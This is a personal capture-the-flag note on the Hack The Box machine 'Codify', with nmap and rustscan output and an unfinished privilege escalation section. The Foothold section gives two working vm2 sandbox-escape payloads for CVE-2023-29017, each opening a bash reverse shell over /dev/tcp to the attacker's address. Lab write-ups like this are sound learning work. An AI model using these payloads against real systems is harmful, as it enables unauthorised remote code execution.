---
id: HTB_Codify
aliases:
  - Codify
tags: []
---

# Codify

> Started on: 2024-04-02

## Host Information

TARGET_IP:

10.10.11.239

TARGET_OS: Linux

## Enumeration

### nmap

```bash
# Nmap 7.94SVN scan initiated Tue Apr  2 18:59:51 2024 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/two/Boxes/Codify/enum/results/10.10.11.239/scans/_full_tcp_nmap.txt -oX /home/two/Boxes/Codify/enum/results/10.10.11.239/scans/xml/_full_tcp_nmap.xml 10.10.11.239
Increasing send delay for 10.10.11.239 from 0 to 5 due to 47 out of 116 dropped probes since last increase.
Increasing send delay for 10.10.11.239 from 5 to 10 due to 11 out of 19 dropped probes since last increase.
Warning: 10.10.11.239 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.239
Host is up, received user-set (0.13s latency).
Scanned at 2024-04-02 18:59:51 MDT for 2439s
Not shown: 63151 closed tcp ports (conn-refused), 2381 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Codify
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  2 19:40:30 2024 -- 1 IP address (1 host up) scanned in 2438.92 seconds
```

### rustscan

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/two/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.239:22
Open 10.10.11.239:80
Open 10.10.11.239:3000
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 19:05 MDT
Initiating Ping Scan at 19:05
Scanning 10.10.11.239 [2 ports]
Completed Ping Scan at 19:05, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:05
Completed Parallel DNS resolution of 1 host. at 19:05, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:05
Scanning 10.10.11.239 [3 ports]
Discovered open port 80/tcp on 10.10.11.239
Discovered open port 22/tcp on 10.10.11.239
Discovered open port 3000/tcp on 10.10.11.239
Completed Connect Scan at 19:05, 0.15s elapsed (3 total ports)
Nmap scan report for 10.10.11.239
Host is up, received syn-ack (0.12s latency).
Scanned at 2024-04-02 19:05:01 MDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

## Exploration

## Foothold

Found exploit
CVE-2023-29017

this allows for a shell.

```javascript
const { VM } = require("vm2");
let vmInstance = new VM();

const code = `
Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -i >& /dev/tcp/10.2.7.195/1337 0>&1'); 
};
(async ()=>{}).constructor('return process')()
`;

vmInstance.run(code);
```

```javascript
const { VM } = require("vm2");
let vmInstance = new VM();

const code = `
Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -i >& /dev/tcp/10.10.14.26/1337 0>&1'); 
};
async function aa(){
    eval("1=1")
}
aa()
`;

vmInstance.run(code);
```

![HTB_CodifyFoothold.png](assets/imgs/HTB_CodifyFoothold.png)

:)

## Privilege Escalation

Probably will loosely follow the writeup as I am still learning privesc.

there is a file called tickets.db with a password hash

![HTB_Codify_hash.png](assets/imgs/HTB_Codify_hash.png)

# Refeerences

-
